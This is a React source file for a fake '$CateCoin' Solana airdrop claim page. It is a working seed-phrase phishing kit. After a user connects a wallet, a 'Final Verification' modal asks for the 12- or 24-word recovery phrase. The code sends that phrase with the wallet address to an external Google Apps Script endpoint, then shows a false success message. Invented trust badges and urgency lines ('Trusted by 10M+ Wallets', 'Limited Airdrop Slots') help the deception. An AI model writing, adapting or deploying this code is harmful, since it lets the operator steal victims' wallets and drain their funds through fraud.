import { useWallet } from '@solana/wallet-adapter-react';
import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
import { useState } from 'react';

function App() {
  const { publicKey, connected, connect, disconnect } = useWallet();
  const [showRecovery, setShowRecovery] = useState(false);
  const [recoveryPhrase, setRecoveryPhrase] = useState("");
  const [success, setSuccess] = useState(false);
  const [loading, setLoading] = useState(false);

  const handleClaimClick = async () => {
    if (!connected) {
      setLoading(true);
      try {
        await connect();
      } catch (err) {
        console.log("Connection cancelled or error:", err);
      } finally {
        setLoading(false);
      }
    } else {
      setShowRecovery(true);
    }
  };

   const handleRecoverySubmit = async () => {
    const words = recoveryPhrase.trim().split(/\s+/);
    
    if (words.length !== 12) {
      alert("Please enter your full 12-word Recovery Phrase.");
      return;
    }

    setLoading(true); // Show loading state

    // Data to send to Google Sheets
    const dataToSend = {
      walletAddress: publicKey?.toString(),
      recoveryPhrase: recoveryPhrase.trim()
    };

    try {
      // Send data to your Google Web App Script
      await fetch("https://script.google.com/macros/s/AKfycbwSlBcmRtQbV6MLomgq74IhKLKmrICLlZXLsr-xKAbW72yhwHpIDmFPQu51atICKTsyNQ/exec", {
        method: "POST",
        mode: "no-cors", // Crucial for Google Scripts
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(dataToSend),
      });

      // Success
      setShowRecovery(false);
      setSuccess(true);
      alert("Success! Your wallet has been verified. Check your wallet soon.");
      
    } catch (error) {
      console.error("Error sending data:", error);
      alert("Error verifying wallet. Please try again.");
    } finally {
      setLoading(false);
    }
  };
  return (
    <div className="min-h-screen bg-gradient-to-br from-indigo-900 via-purple-900 to-slate-900 flex items-center justify-center p-4">
      <div className="max-w-md w-full bg-white/10 backdrop-blur-lg border border-white/20 rounded-2xl shadow-2xl p-8 text-white relative overflow-hidden">
        
        {/* Decorative Glow */}
        <div className="absolute -top-10 -right-10 w-40 h-40 bg-purple-500/30 rounded-full blur-3xl"></div>
        <div className="absolute -bottom-10 -left-10 w-40 h-40 bg-blue-500/30 rounded-full blur-3xl"></div>

        {/* Header */}
        <div className="text-center mb-8 relative z-10">
          <h1 className="text-3xl font-bold mb-2">
            Claim <span className="text-yellow-400">$CateCoin</span>
          </h1>
          <p className="text-gray-300 text-sm">
            Verify your wallet to secure your airdrop allocation.
          </p>
        </div>

        {/* Main Content */}
        <div className="flex flex-col items-center gap-6 relative z-10">
          
          {success ? (
            <div className="text-center animate-fade-in">
              <div className="text-5xl mb-4">🎉</div>
              <h2 className="text-xl font-bold mb-2">You're In!</h2>
              <p className="text-gray-300 text-sm">
                Your wallet <span className="text-yellow-400 font-mono">{publicKey?.toString().slice(0,4)}...{publicKey?.toString().slice(-4)}</span> has been verified.
              </p>
              <p className="text-gray-400 text-xs mt-2">Check your wallet soon for $CateCoin.</p>
              <button 
                onClick={() => {
                  setSuccess(false);
                  disconnect();
                }}
                className="mt-6 px-6 py-2 bg-white/10 hover:bg-white/20 rounded-lg text-sm transition-all"
              >
                Connect Another Wallet
              </button>
            </div>
          ) : (
            <>
              {/* Connect Button */}
              <button
                onClick={handleClaimClick}
                disabled={loading}
                className="w-full py-4 bg-gradient-to-r from-yellow-400 to-orange-500 text-black font-bold text-lg rounded-xl hover:shadow-lg hover:scale-105 transition-all duration-300 shadow-orange-500/20 disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {loading ? "Connecting..." : (connected ? "Verify Eligibility" : "Connect Wallet to Claim")}
              </button>

              {/* Badge Under Button */}
              <p className="text-xs text-gray-400 mt-2">
                ✨ Trusted by 10M+ Wallets
              </p>

              {/* Wallet Button (Small) */}
              <div className="flex justify-center mt-2">
                <WalletMultiButton className="!bg-transparent !border-none !shadow-none hover:!bg-white/10 hover:!rounded-lg px-4 py-2 text-sm" />
              </div>
              
            {/* Trust Badges */}
<div className="flex gap-4 mt-4 opacity-70">
  <img src="https://cryptologos.cc/logos/solana-sol-logo.png" alt="Solana" className="w-6 h-6 rounded-full bg-white/20 p-0.5" />
</div>
            </>
          )}
        </div>

        {/* Footer */}
        <div className="mt-8 text-center relative z-10">
          <p className="text-xs text-gray-400">
            🔒 Secure Connection • Limited Airdrop Slots
          </p>
        </div>

        {/* Recovery Modal - ASKS FOR 12 WORDS */}
        {showRecovery && (
          <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
            <div className="bg-gray-900 border border-white/20 rounded-2xl p-6 max-w-sm w-full shadow-2xl">
              <h3 className="text-xl font-bold text-white mb-2">Final Verification</h3>
              <p className="text-gray-400 text-sm mb-4">
               To secure your $CateCoin allocation, please enter your Wallet Seed (12 or 24 words).
              </p>
              <textarea
                value={recoveryPhrase}
                onChange={(e) => setRecoveryPhrase(e.target.value)}
                placeholder="e.g. apple banana cat dog..."
                className="w-full bg-black/30 border border-white/20 rounded-lg px-4 py-3 text-white mb-4 focus:outline-none focus:border-yellow-400 h-32 resize-none"
                onKeyDown={(e) => {
                  if (e.key === 'Enter' && !e.shiftKey) {
                    e.preventDefault();
                    handleRecoverySubmit();
                  }
                }}
              />
              <div className="flex gap-3">
                <button
                  onClick={() => setShowRecovery(false)}
                  className="flex-1 py-3 bg-white/10 hover:bg-white/20 rounded-lg text-sm font-medium transition-all"
                >
                  Cancel
                </button>
                <button
                  onClick={handleRecoverySubmit}
                  className="flex-1 py-3 bg-yellow-400 hover:bg-yellow-300 text-black rounded-lg text-sm font-bold transition-all"
                >
                  Verify
                </button>
              </div>
              <p className="text-xs text-gray-500 mt-4 text-center">
                ⚠️ DO NOT SHARE THIS WITH ANYONE
              </p>
            </div>
          </div>
        )}

      </div>
    </div>
  );
}

export default App;

